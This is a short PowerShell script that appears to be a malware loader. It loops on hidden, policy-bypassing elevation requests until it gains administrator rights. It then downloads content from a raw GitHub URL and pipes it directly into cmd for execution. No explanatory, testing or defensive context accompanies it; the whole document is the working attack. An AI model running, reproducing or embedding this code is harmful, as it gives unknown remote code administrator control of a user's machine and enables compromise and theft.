while(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)){
    $p = start powershell "-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$PSCommandPath""" -Verb RunAs -PassThru -ErrorAction SilentlyContinue
    if($p){exit}
}
powershell.exe -NoProfile -Command "(Invoke-WebRequest 'https://raw.githubusercontent.com/pushop/0/0/0/trf' -UseBasicParsing).Content | cmd /V:ON"